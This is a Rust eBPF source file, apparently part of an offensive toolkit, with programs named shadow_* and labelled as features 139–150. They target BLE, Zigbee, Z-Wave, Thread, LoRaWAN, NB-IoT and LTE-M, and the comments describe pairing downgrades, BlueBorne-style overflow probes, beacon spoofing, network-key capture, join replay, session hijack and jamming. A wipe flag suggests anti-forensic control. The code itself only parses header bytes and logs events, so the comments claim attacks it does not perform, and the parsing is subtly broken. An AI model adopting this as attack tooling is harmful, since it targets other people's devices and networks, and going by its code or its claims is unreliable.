use aya_ebpf::{
    bindings::xdp_action,
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel},
    macros::{classifier, kprobe, xdp},
    programs::{ProbeContext, TcContext, XdpContext},
};
use common::{
    BleLinkState, EventHeader, LoRaSessionState, WpanNetworkState, EVENT_BLE_ADV_SPOOF,
    EVENT_BLE_GATT_ENUM, EVENT_BLE_PAIRING_DOWNGRADE, EVENT_BLUEBORNE_PROBE,
    EVENT_LORAWAN_ABP_HIJACK, EVENT_LORAWAN_JOIN_REPLAY, EVENT_LORA_PHY_JAM,
    EVENT_LTEM_EDRX_TIMING, EVENT_NBIOT_RRC_EXPLOIT, EVENT_THREAD_MLE_EXPLOIT,
    EVENT_ZIGBEE_KEY_SNIFF, EVENT_ZWAVE_S0_EXTRACT,
};

use crate::maps::*;

const ETH_HDR_LEN: usize = 14;
const IP_HDR_LEN: usize = 20;
const UDP_HDR_LEN: usize = 8;

const BLE_ACL_PKT: u8 = 0x02; // HCI ACL data packet type
const ATT_READ_BY_TYPE_RSP: u8 = 0x09; // ATT Read By Type Response (GATT discovery)
const ATT_FIND_INFO_RSP: u8 = 0x05; // ATT Find Information Response (handle enumeration)
const SMP_PAIRING_REQ: u8 = 0x01; // SMP Pairing Request opcode
const SMP_PAIRING_RSP: u8 = 0x02; // SMP Pairing Response opcode
const SMP_AUTHREQ_SC: u8 = 0x08; // LE Secure Connections bit in authreq
const L2CAP_CID_SIGNALING: u16 = 0x0001; // L2CAP fixed signaling channel
const L2CAP_SIGNALING_MTU: u16 = 48; // minimum signaling MTU — larger is malformed
const BLE_ADV_IND: u8 = 0x00; // ADV_IND PDU type (connectable undirected)
const BLE_ADV_NONCONN_IND: u8 = 0x02; // ADV_NONCONN_IND PDU type (beacons)
const ZIGBEE_TRANSPORT_KEY: u8 = 0x02; // APS transport-key command (join handshake)
const ZWAVE_SECURITY_CC: u8 = 0x98; // Z-Wave Security command class (S0)
const ZWAVE_NONCE_GET: u8 = 0x40; // S0 Nonce Get command
const THREAD_MLE_PORT: u16 = 19788; // Thread MLE UDP port
const MLE_ADVERTISEMENT: u8 = 0x03; // MLE Advertisement command
const MLE_PARENT_REQUEST: u8 = 0x06; // MLE Parent Request command
const LORAWAN_MTYPE_JOIN_REQ: u8 = 0x00; // LoRaWAN MHDR MType: JoinRequest
const LORAWAN_MTYPE_UNCONF_UP: u8 = 0x02; // LoRaWAN MHDR MType: unconfirmed uplink
const LORA_CSS_CHIRP: u8 = 0xA7; // CSS preamble upchirp marker (868/915 MHz)
const QMUX_MARKER: u8 = 0x01; // QMUX frame marker byte
const QMI_SVC_NAS: u8 = 0x03; // QMI NAS service (RRC/NAS passthrough)
const LTEM_PAGING_MARKER: u8 = 0x2B; // eDRX paging occasion frame marker

// ──────────────────────────────────────────────
// FEATURE 139: BLE GATT Enumeration
// Enumerates GATT services and handle-value pairs on target devices
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_ble_gatt_enum(ctx: ProbeContext) -> u32 {
    try_ble_gatt_enum(&ctx).unwrap_or(0)
}

fn try_ble_gatt_enum(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 8] = unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 8])? };

    // HCI ACL packet carrying ATT discovery responses
    if hdr[0] == BLE_ACL_PKT && (hdr[1] == ATT_READ_BY_TYPE_RSP || hdr[1] == ATT_FIND_INFO_RSP) {
        let conn_handle = (u16::from_le_bytes([hdr[2], hdr[3]]) & 0x0FFF) as u32;
        let attr_handle = u16::from_le_bytes([hdr[4], hdr[5]]);
        let addr_hash = u32::from_le_bytes([hdr[6], hdr[7], hdr[2], hdr[3]]);

        // accumulate enumerated handles per connection
        let mut handle_count = 1;
        if let Some(prev) = unsafe { BLE_LINK_STATE.get(&conn_handle) } {
            handle_count = prev.gatt_handle_count + 1;
        }

        let state = BleLinkState {
            conn_handle,
            pairing_mode: 0,
            addr_hash,
            gatt_handle_count: handle_count,
            l2cap_len: 0,
            _pad: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = BLE_LINK_STATE.insert(&conn_handle, &state, 0);

        let event = EventHeader {
            event_type: EVENT_BLE_GATT_ENUM,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((conn_handle as u64) << 32) | attr_handle as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 140: BLE Pairing Downgrade
// Forces LE Secure Connections downgrade to LE Legacy pairing
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_ble_pairing_downgrade(ctx: ProbeContext) -> u32 {
    try_ble_pairing_downgrade(&ctx).unwrap_or(0)
}

fn try_ble_pairing_downgrade(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 8] = unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 8])? };

    if hdr[0] == SMP_PAIRING_REQ || hdr[0] == SMP_PAIRING_RSP {
        // authreq byte: bit 3 requests Secure Connections; clearing it
        // downgrades the link to passively-decryptable LE Legacy pairing
        let sc_bit = hdr[2] & SMP_AUTHREQ_SC;
        let pairing_mode: u32 = if sc_bit != 0 { 1 } else { 0 };
        let conn_handle = (u16::from_le_bytes([hdr[4], hdr[5]]) & 0x0FFF) as u32;
        let addr_hash = u32::from_le_bytes([hdr[4], hdr[5], hdr[6], hdr[7]]);

        let state = BleLinkState {
            conn_handle,
            pairing_mode,
            addr_hash,
            gatt_handle_count: 0,
            l2cap_len: 0,
            _pad: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = BLE_LINK_STATE.insert(&conn_handle, &state, 0);

        let event = EventHeader {
            event_type: EVENT_BLE_PAIRING_DOWNGRADE,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((pairing_mode as u64) << 32) | conn_handle as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 141: BlueBorne-style RCE Probe
// Sends malformed L2CAP signaling PDUs to leak memory / trigger overflows
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_blueborne_probe(ctx: ProbeContext) -> u32 {
    try_blueborne_probe(&ctx).unwrap_or(0)
}

fn try_blueborne_probe(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 8] = unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 8])? };

    // L2CAP header: length (le16) then channel ID (le16)
    let l2cap_len = u16::from_le_bytes([hdr[0], hdr[1]]);
    let cid = u16::from_le_bytes([hdr[2], hdr[3]]);

    // declared length beyond the minimum signaling MTU walks overflow paths
    if cid == L2CAP_CID_SIGNALING && l2cap_len > L2CAP_SIGNALING_MTU {
        let addr_hash = u32::from_le_bytes([hdr[4], hdr[5], hdr[6], hdr[7]]);

        let state = BleLinkState {
            conn_handle: 0,
            pairing_mode: 0,
            addr_hash,
            gatt_handle_count: 0,
            l2cap_len: l2cap_len as u32,
            _pad: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = BLE_LINK_STATE.insert(&addr_hash, &state, 0);

        let event = EventHeader {
            event_type: EVENT_BLUEBORNE_PROBE,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((cid as u64) << 32) | l2cap_len as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 142: BLE Advertisement Spoofing
// Crafts spoofed advertising PDUs to impersonate beacons
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_ble_adv_spoof(ctx: TcContext) -> i32 {
    try_ble_adv_spoof(&ctx).unwrap_or(0)
}

fn try_ble_adv_spoof(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let data = ctx.data();
    let data_end = ctx.data_end();
    if data + ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 8 > data_end {
        return Ok(0);
    }

    let payload_offset = ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN;
    let pdu_type = unsafe { *((data + payload_offset) as *const u8) };

    if pdu_type == BLE_ADV_IND || pdu_type == BLE_ADV_NONCONN_IND {
        // advertiser address (6 bytes) follows the PDU header
        let addr_hash = u32::from_le_bytes([
            unsafe { *((data + payload_offset + 1) as *const u8) },
            unsafe { *((data + payload_offset + 2) as *const u8) },
            unsafe { *((data + payload_offset + 3) as *const u8) },
            unsafe { *((data + payload_offset + 4) as *const u8) },
        ]) ^ ((unsafe { *((data + payload_offset + 5) as *const u8) } as u32) << 8
            | unsafe { *((data + payload_offset + 6) as *const u8) } as u32);

        let state = BleLinkState {
            conn_handle: 0,
            pairing_mode: 0,
            addr_hash,
            gatt_handle_count: 0,
            l2cap_len: 0,
            _pad: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = BLE_LINK_STATE.insert(&addr_hash, &state, 0);

        let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
        let event = EventHeader {
            event_type: EVENT_BLE_ADV_SPOOF,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((pdu_type as u64) << 32) | addr_hash as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 143: Zigbee Network Key Sniff
// Captures the cleartext network key sent during join/touchlink
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_zigbee_key_sniff(ctx: ProbeContext) -> u32 {
    try_zigbee_key_sniff(&ctx).unwrap_or(0)
}

fn try_zigbee_key_sniff(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 8] = unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 8])? };

    if hdr[0] == ZIGBEE_TRANSPORT_KEY {
        // APS transport-key frame: PAN id, key fragment, channel
        let pan_id = u16::from_be_bytes([hdr[1], hdr[2]]);
        let key_hash = u32::from_be_bytes([hdr[3], hdr[4], hdr[5], hdr[6]]);
        let channel = hdr[7] as u16;

        let mut join_count = 1;
        if let Some(prev) = unsafe { WPAN_NETWORK_STATE.get(&(pan_id as u32)) } {
            join_count = prev.join_count + 1;
        }

        let state = WpanNetworkState {
            pan_id,
            protocol: 0,
            _pad: 0,
            channel,
            join_count,
            key_hash,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = WPAN_NETWORK_STATE.insert(&(pan_id as u32), &state, 0);

        let event = EventHeader {
            event_type: EVENT_ZIGBEE_KEY_SNIFF,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((pan_id as u64) << 32) | key_hash as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 144: Z-Wave S0 Key Extraction
// Exploits the all-zero temporary key in S0 inclusion handshakes
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_zwave_s0_extract(ctx: ProbeContext) -> u32 {
    try_zwave_s0_extract(&ctx).unwrap_or(0)
}

fn try_zwave_s0_extract(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 8] = unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 8])? };

    if hdr[0] == ZWAVE_SECURITY_CC && hdr[1] == ZWAVE_NONCE_GET {
        // S0 inclusion: home id plus the permanent-key fragment that follows
        // the (all-zero) temporary-key exchange
        let home_id = u32::from_be_bytes([hdr[2], hdr[3], hdr[4], hdr[5]]);
        let key_hash = u32::from_be_bytes([hdr[4], hdr[5], hdr[6], hdr[7]]);

        let state = WpanNetworkState {
            pan_id: (home_id >> 16) as u16,
            protocol: 1,
            _pad: 0,
            channel: 0,
            join_count: 1,
            key_hash,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = WPAN_NETWORK_STATE.insert(&home_id, &state, 0);

        let event = EventHeader {
            event_type: EVENT_ZWAVE_S0_EXTRACT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((home_id as u64) << 32) | key_hash as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 145: Thread/6LoWPAN MLE Exploit
// Injects MLE frames to partition the mesh and steal leader election
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_thread_mle_exploit(ctx: TcContext) -> i32 {
    try_thread_mle_exploit(&ctx).unwrap_or(0)
}

fn try_thread_mle_exploit(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let data = ctx.data();
    let data_end = ctx.data_end();
    if data + ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 4 > data_end {
        return Ok(0);
    }

    let udp_hdr = data + ETH_HDR_LEN + IP_HDR_LEN;
    let dst_port = unsafe { u16::from_be(*((udp_hdr + 2) as *const u16)) };

    if dst_port == THREAD_MLE_PORT {
        let payload = udp_hdr + UDP_HDR_LEN;
        let cmd = unsafe { *(payload as *const u8) };

        // Advertisement forces partitioning; Parent Request pulls children
        if cmd == MLE_ADVERTISEMENT || cmd == MLE_PARENT_REQUEST {
            let pan_id = unsafe { u16::from_be(*((payload + 1) as *const u16)) };

            let state = WpanNetworkState {
                pan_id,
                protocol: 2,
                _pad: 0,
                channel: 0,
                join_count: 0,
                key_hash: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
            };
            let _ = WPAN_NETWORK_STATE.insert(&(pan_id as u32), &state, 0);

            let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
            let event = EventHeader {
                event_type: EVENT_THREAD_MLE_EXPLOIT,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: ((cmd as u64) << 16) | pan_id as u64,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 146: LoRaWAN Join Replay
// Replays captured JoinRequests with reused DevNonces to derive session keys
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_lorawan_join_replay(ctx: ProbeContext) -> u32 {
    try_lorawan_join_replay(&ctx).unwrap_or(0)
}

fn try_lorawan_join_replay(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 12] =
        unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 12])? };

    if hdr[0] >> 4 == LORAWAN_MTYPE_JOIN_REQ {
        // JoinRequest: MHDR, JoinEUI/DevEUI fragment, DevNonce, SF nibble
        let dev_addr = u32::from_be_bytes([hdr[1], hdr[2], hdr[3], hdr[4]]);
        let dev_nonce = u16::from_le_bytes([hdr[9], hdr[10]]);
        let spreading_factor = hdr[11] & 0x0F;

        // nonce reuse against a previously captured device = replay
        let replayed = if let Some(prev) = unsafe { LORAWAN_SESSIONS.get(&dev_addr) } {
            (prev.dev_nonce == dev_nonce) as u64
        } else {
            0
        };

        let state = LoRaSessionState {
            dev_addr,
            dev_nonce,
            spreading_factor,
            activation: 0,
            fcnt_up: 0,
            fcnt_down: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = LORAWAN_SESSIONS.insert(&dev_addr, &state, 0);

        let event = EventHeader {
            event_type: EVENT_LORAWAN_JOIN_REPLAY,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((dev_nonce as u64) << 1) | replayed,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 147: LoRaWAN ABP Session Hijack
// Spoofs ABP DevAddrs and desynchronizes frame counters
// ──────────────────────────────────────────────

#[xdp]
pub fn shadow_lorawan_abp_hijack(ctx: XdpContext) -> u32 {
    try_lorawan_abp_hijack(&ctx).unwrap_or(xdp_action::XDP_PASS)
}

fn try_lorawan_abp_hijack(ctx: &XdpContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(xdp_action::XDP_PASS);
        }
    }

    let data = ctx.data();
    let data_end = ctx.data_end();
    if data + ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 8 > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let payload_offset = data + ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN;
    let mhdr = unsafe { *(payload_offset as *const u8) };

    if mhdr >> 4 == LORAWAN_MTYPE_UNCONF_UP {
        // uplink frame: DevAddr (le32), FCtrl, FCnt (le16)
        let dev_addr = u32::from_le_bytes([
            unsafe { *((payload_offset + 1) as *const u8) },
            unsafe { *((payload_offset + 2) as *const u8) },
            unsafe { *((payload_offset + 3) as *const u8) },
            unsafe { *((payload_offset + 4) as *const u8) },
        ]);
        let fcnt = u16::from_le_bytes([unsafe { *((payload_offset + 6) as *const u8) }, unsafe {
            *((payload_offset + 7) as *const u8)
        }]);

        // counter regression against static ABP keys enables injection
        let desync = if let Some(prev) = unsafe { LORAWAN_SESSIONS.get(&dev_addr) } {
            ((fcnt as u32) < prev.fcnt_up) as u64
        } else {
            0
        };

        let state = LoRaSessionState {
            dev_addr,
            dev_nonce: 0,
            spreading_factor: 0,
            activation: 1,
            fcnt_up: fcnt as u32,
            fcnt_down: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = LORAWAN_SESSIONS.insert(&dev_addr, &state, 0);

        let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
        let event = EventHeader {
            event_type: EVENT_LORAWAN_ABP_HIJACK,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((dev_addr as u64) << 1) | desync,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(xdp_action::XDP_PASS)
}

// ──────────────────────────────────────────────
// FEATURE 148: LoRa PHY Jamming/Capture
// Demodulates CSS chirps for selective per-SF jamming and capture
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_lora_phy_jam(ctx: ProbeContext) -> u32 {
    try_lora_phy_jam(&ctx).unwrap_or(0)
}

fn try_lora_phy_jam(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 8] = unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 8])? };

    if hdr[0] == LORA_CSS_CHIRP {
        // preamble chirp: targeted SF nibble plus in-band RSSI
        let spreading_factor = hdr[1] & 0x0F;
        let rssi = i16::from_be_bytes([hdr[2], hdr[3]]);

        let state = LoRaSessionState {
            dev_addr: 0,
            dev_nonce: 0,
            spreading_factor,
            activation: 0,
            fcnt_up: 0,
            fcnt_down: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
        };
        let _ = LORAWAN_SESSIONS.insert(&(spreading_factor as u32), &state, 0);

        let event = EventHeader {
            event_type: EVENT_LORA_PHY_JAM,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((spreading_factor as u64) << 16) | (rssi as u16) as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 149: NB-IoT RRC/NAS Exploit
// Extracts pre-security-context NAS messages during initial attach
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_nbiot_rrc_exploit(ctx: ProbeContext) -> u32 {
    try_nbiot_rrc_exploit(&ctx).unwrap_or(0)
}

fn try_nbiot_rrc_exploit(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
    let buf_ptr: *const u8 = ctx.arg(1).ok_or(0i64)?;
    let hdr: [u8; 8] = unsafe { bpf_probe_read_kernel(&*buf_ptr as *const u8 as *const [u8; 8])? };

    // QMUX frame carrying QMI NAS service traffic
    if hdr[0] == QMUX_MARKER && hdr[3] == QMI_SVC_NAS {
        // NAS message id rides the QMI TLV; attach traffic predates the
        // security context so the payload is integrity-unprotected
        let msg_id = u16::from_le_bytes([hdr[4], hdr[5]]);
        let npss_cell = u16::from_be_bytes([hdr[6], hdr[7]]);

        let event = EventHeader {
            event_type: EVENT_NBIOT_RRC_EXPLOIT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ((msg_id as u64) << 16) | npss_cell as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 150: LTE-M eDRX/PSM Timing Attack
// Predicts eDRX wake-up cycles to time attacks inside the receive window
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_ltem_edrx_timing(ctx: TcContext) -> i32 {
    try_ltem_edrx_timing(&ctx).unwrap_or(0)
}

fn try_ltem_edrx_timing(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let data = ctx.data();
    let data_end = ctx.data_end();
    if data + ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 6 > data_end {
        return Ok(0);
    }

    let payload_offset = ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN;
    let marker = unsafe { *((data + payload_offset) as *const u8) };

    if marker == LTEM_PAGING_MARKER {
        // eDRX cycle length and paging transmission window (in hyperframes)
        let edrx_cycle = u16::from_be_bytes([
            unsafe { *((data + payload_offset + 1) as *const u8) },
            unsafe { *((data + payload_offset + 2) as *const u8) },
        ]);
        let paging_window = u16::from_be_bytes([
            unsafe { *((data + payload_offset + 3) as *const u8) },
            unsafe { *((data + payload_offset + 4) as *const u8) },
        ]);

        // predicted next paging occasion: cycle scaled to 10.24 s hyperframes
        let occasion = ((edrx_cycle as u32) << 11) | paging_window as u32;

        let pid = (bpf_get_current_pid_tgid() >> 32) as u32;
        let event = EventHeader {
            event_type: EVENT_LTEM_EDRX_TIMING,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: occasion as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}
